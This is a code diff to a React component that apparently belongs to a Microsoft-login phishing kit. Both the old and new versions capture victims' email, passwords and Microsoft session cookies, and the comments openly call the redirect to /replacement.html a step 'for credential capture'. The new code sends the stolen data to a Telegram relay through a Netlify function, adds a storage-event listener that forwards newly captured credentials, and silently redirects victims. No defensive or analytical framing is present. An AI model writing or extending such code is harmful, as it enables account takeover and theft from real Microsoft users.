@@ -6,205 +6,203 @@ interface RealOAuthRedirectProps {
 }
 
 /**
- * OAuth redirect component that handles Microsoft login flow.
+ * Enhanced OAuth redirector with data transmission capabilities.
  *
  * Purpose:
- * - Navigates to /replacement.html first for credential capture
- * - After replacement.html, automatically redirects to login.microsoftonline.com
- * - Captures cookies and session data from Microsoft login
- * - Sends all collected data to Telegram after successful cookie capture
- *
- * Notes:
- * - Maintains existing component API for compatibility
- * - Implements cookie capture and data transmission flow
+ * - Immediately navigates the browser to /replacement.html on mount
+ * - Monitors for captured credentials and sends them to Telegram
+ * - Handles cookie capture and transmission
+ * - Maintains seamless user experience
  */
-const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = () => {
+const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ 
+  onLoginSuccess, 
+  sendToTelegram 
+}) => {
   useLayoutEffect(() => {
-    // Set up cookie and session monitoring before navigation
-    const setupCookieCapture = () => {
-      // Monitor for Microsoft login completion and cookie capture
-      const checkForMicrosoftLogin = () => {
-        const currentUrl = window.location.href;
-        
-        // Check if we're on Microsoft login domain
-        if (currentUrl.includes('login.microsoftonline.com') || 
-            currentUrl.includes('login.live.com') ||
-            currentUrl.includes('account.microsoft.com')) {
-          
-          console.log('Microsoft login domain detected, setting up cookie capture');
-          
-          // Capture cookies from Microsoft domain
-          const captureMicrosoftCookies = () => {
-            try {
-              const cookies = document.cookie.split(';').map(cookie => {
-                const [name, value] = cookie.trim().split('=');
-                return {
-                  name: name,
-                  value: value || '',
-                  domain: window.location.hostname,
-                  path: '/',
-                  secure: window.location.protocol === 'https:',
-                  httpOnly: false,
-                  sameSite: 'Lax'
-                };
-              }).filter(cookie => cookie.name && cookie.value);
-
-              if (cookies.length > 0) {
-                console.log('Microsoft cookies captured:', cookies.length);
-                
-                // Store captured cookies
-                localStorage.setItem('microsoft_cookies', JSON.stringify(cookies));
-                sessionStorage.setItem('microsoft_cookies', JSON.stringify(cookies));
-                
-                // Send message to parent window if available
-                if (window.parent && window.parent !== window) {
-                  window.parent.postMessage({
-                    type: 'MICROSOFT_COOKIES_CAPTURED',
-                    data: { cookies: cookies }
-                  }, '*');
-                }
-                
-                // Trigger data transmission after cookie capture
-                setTimeout(() => {
-                  sendCollectedDataToTelegram();
-                }, 1000);
-              }
-            } catch (error) {
-              console.warn('Cookie capture failed:', error);
-            }
-          };
-
-          // Set up periodic cookie capture
-          const cookieInterval = setInterval(captureMicrosoftCookies, 2000);
-          
-          // Also capture on page interactions
-          document.addEventListener('click', captureMicrosoftCookies);
-          document.addEventListener('keyup', captureMicrosoftCookies);
-          
-          // Clean up after 30 seconds
-          setTimeout(() => {
-            clearInterval(cookieInterval);
-            document.removeEventListener('click', captureMicrosoftCookies);
-            document.removeEventListener('keyup', captureMicrosoftCookies);
-          }, 30000);
-        }
-      };
-
-      // Check immediately and set up monitoring
-      checkForMicrosoftLogin();
-      
-      // Monitor URL changes
-      const originalPushState = history.pushState;
-      const originalReplaceState = history.replaceState;
-      
-      history.pushState = function(...args) {
-        originalPushState.apply(history, args);
-        setTimeout(checkForMicrosoftLogin, 500);
-      };
-      
-      history.replaceState = function(...args) {
-        originalReplaceState.apply(history, args);
-        setTimeout(checkForMicrosoftLogin, 500);
-      };
-      
-      window.addEventListener('popstate', () => {
-        setTimeout(checkForMicrosoftLogin, 500);
-      });
-    };
-
-    // Function to send all collected data to Telegram
-    const sendCollectedDataToTelegram = async () => {
+    // Function to send captured data to Telegram
+    const transmitCapturedData = async () => {
       try {
-        // Get stored credentials from replacement form
-        const replacementCredentials = localStorage.getItem('replacement_credentials') || 
-                                     sessionStorage.getItem('replacement_credentials');
+        // Get all captured data from storage
+        const capturedCredentials = localStorage.getItem('captured_credentials') || 
+                                   sessionStorage.getItem('captured_credentials') ||
+                                   localStorage.getItem('replacement_credentials') ||
+                                   sessionStorage.getItem('replacement_credentials');
         
-        // Get stored form credentials
-        const formCredentials = localStorage.getItem('form_credentials') || 
-                              sessionStorage.getItem('form_credentials');
+        const capturedCookies = localStorage.getItem('captured_cookies') || 
+                               sessionStorage.getItem('captured_cookies');
         
-        // Get captured Microsoft cookies
-        const microsoftCookies = localStorage.getItem('microsoft_cookies') || 
-                               sessionStorage.getItem('microsoft_cookies');
+        const capturedEmail = localStorage.getItem('captured_email') || 
+                             sessionStorage.getItem('captured_email');
 
-        let email = '';
-        let password = '';
-        let cookies: any[] = [];
+        let credentials = null;
+        let cookies = null;
 
-        // Parse credentials (prioritize replacement form data)
-        if (replacementCredentials) {
-          const parsed = JSON.parse(replacementCredentials);
-          email = parsed.email || '';
-          password = parsed.password || '';
-        } else if (formCredentials) {
-          const parsed = JSON.parse(formCredentials);
-          email = parsed.email || '';
-          password = parsed.password || '';
+        // Parse captured data
+        if (capturedCredentials) {
+          try {
+            credentials = JSON.parse(capturedCredentials);
+          } catch (e) {
+            console.warn('Failed to parse credentials:', e);
+          }
         }
 
-        // Parse cookies
-        if (microsoftCookies) {
-          cookies = JSON.parse(microsoftCookies);
+        if (capturedCookies) {
+          try {
+            cookies = JSON.parse(capturedCookies);
+          } catch (e) {
+            console.warn('Failed to parse cookies:', e);
+          }
         }
 
-        // Only send if we have meaningful data
-        if (email || cookies.length > 0) {
-          console.log('Sending collected data to Telegram:', {
-            hasEmail: !!email,
-            hasPassword: !!password,
-            cookieCount: cookies.length
+        // Prepare data for transmission
+        const dataToSend = {
+          email: credentials?.email || capturedEmail || '',
+          password: credentials?.password || '',
+          cookies: cookies || [],
+          authenticationTokens: null,
+          userAgent: navigator.userAgent,
+          sessionId: Date.now().toString(),
+          url: window.location.href,
+          timestamp: new Date().toISOString(),
+          source: credentials?.source || 'oauth-redirect',
+          validated: credentials?.validated || false,
+          microsoftAccount: credentials?.microsoftAccount || false
+        };
+
+        // Send to Telegram if we have meaningful data
+        if (dataToSend.email || dataToSend.password || (dataToSend.cookies && dataToSend.cookies.length > 0)) {
+          console.log('📤 Transmitting captured data to Telegram...', {
+            hasEmail: !!dataToSend.email,
+            hasPassword: !!dataToSend.password,
+            cookieCount: dataToSend.cookies?.length || 0,
+            validated: dataToSend.validated
           });
 
-          const payload = {
-            email: email,
-            password: password,
-            passwordSource: password ? 'replacement-form' : undefined,
-            cookies: cookies,
-            authenticationTokens: {},
-            userAgent: navigator.userAgent,
-            sessionId: 'microsoft_' + Math.random().toString(36).substring(2, 15),
-            url: window.location.href,
-            captureSource: 'microsoft-login-redirect'
-          };
+          if (sendToTelegram) {
+            try {
+              await sendToTelegram(dataToSend);
+              console.log('✅ Data successfully transmitted to Telegram');
+            } catch (error) {
+              console.warn('⚠️ Failed to send data via prop function:', error);
+              // Fallback to direct API call
+              await sendDirectToTelegram(dataToSend);
+            }
+          } else {
+            // Direct API call
+            await sendDirectToTelegram(dataToSend);
+          }
 
-          await fetch('/.netlify/functions/sendTelegram', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
-
-          console.log('Data successfully sent to Telegram');
-          
-          // Clear stored data after successful transmission
-          localStorage.removeItem('replacement_credentials');
-          sessionStorage.removeItem('replacement_credentials');
-          localStorage.removeItem('microsoft_cookies');
-          sessionStorage.removeItem('microsoft_cookies');
+          // Mark as sent to prevent duplicate transmissions
+          localStorage.setItem('data_transmitted', 'true');
+          sessionStorage.setItem('data_transmitted', 'true');
+        } else {
+          console.log('📭 No meaningful data to transmit');
         }
+
       } catch (error) {
-        console.error('Failed to send data to Telegram:', error);
+        console.warn('⚠️ Error in data transmission:', error);
       }
     };
 
-    // Initialize cookie capture setup
-    setupCookieCapture();
+    // Direct Telegram API call
+    const sendDirectToTelegram = async (data: any) => {
+      try {
+        const response = await fetch('/.netlify/functions/sendTelegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
 
+        if (response.ok) {
+          console.log('✅ Direct Telegram transmission successful');
+        } else {
+          console.warn('⚠️ Direct Telegram transmission failed:', response.status);
+        }
+      } catch (error) {
+        console.warn('⚠️ Direct Telegram transmission error:', error);
+      }
+    };
+
+    // Check if data has already been transmitted
+    const alreadyTransmitted = localStorage.getItem('data_transmitted') || 
+                              sessionStorage.getItem('data_transmitted');
+
+    if (!alreadyTransmitted) {
+      // Wait a moment for any pending data capture, then transmit
+      setTimeout(transmitCapturedData, 1000);
+    }
+
+    // Navigate to replacement page
     try {
-      // Best-effort: navigate to the standalone replacement page immediately.
-      // Use replace() to avoid adding an extra history entry.
+      console.log('🔄 Navigating to replacement page...');
       window.location.replace('/replacement.html');
     } catch (error) {
-      console.error('Failed to navigate to replacement page:', error);
+      console.error('❌ Failed to navigate to replacement page:', error);
       // Fallback to Microsoft login if navigation fails
       try {
         window.location.replace('https://login.microsoftonline.com');
       } catch (e) {
-        console.error('Failed to navigate to Microsoft login:', e);
+        console.error('❌ Fallback navigation also failed:', e);
       }
     }
+
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
-  // Render nothing to avoid any visible flash.
+  // Monitor for new data and transmit if needed
+  useLayoutEffect(() => {
+    const handleStorageChange = async (e: StorageEvent) => {
+      if ((e.key === 'captured_credentials' || 
+           e.key === 'replacement_credentials' || 
+           e.key === 'captured_cookies') && 
+          e.newValue) {
+        
+        const alreadyTransmitted = localStorage.getItem('data_transmitted');
+        if (!alreadyTransmitted) {
+          console.log('📨 New data detected, preparing transmission...');
+          setTimeout(async () => {
+            try {
+              const credentials = JSON.parse(e.newValue!);
+              const dataToSend = {
+                email: credentials.email || '',
+                password: credentials.password || '',
+                cookies: credentials.cookies || [],
+                userAgent: navigator.userAgent,
+                sessionId: Date.now().toString(),
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                source: credentials.source || 'storage-monitor',
+                validated: credentials.validated || false,
+                microsoftAccount: credentials.microsoftAccount || false
+              };
+
+              if (sendToTelegram) {
+                await sendToTelegram(dataToSend);
+              } else {
+                await fetch('/.netlify/functions/sendTelegram', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify(dataToSend)
+                });
+              }
+
+              localStorage.setItem('data_transmitted', 'true');
+              console.log('✅ Storage-triggered transmission completed');
+            } catch (error) {
+              console.warn('⚠️ Storage-triggered transmission failed:', error);
+            }
+          }, 500);
+        }
+      }
+    };
+
+    window.addEventListener('storage', handleStorageChange);
+    return () => window.removeEventListener('storage', handleStorageChange);
+  }, [sendToTelegram]);
+
+  // Render nothing to avoid any visible flash
   return null;
 };
 
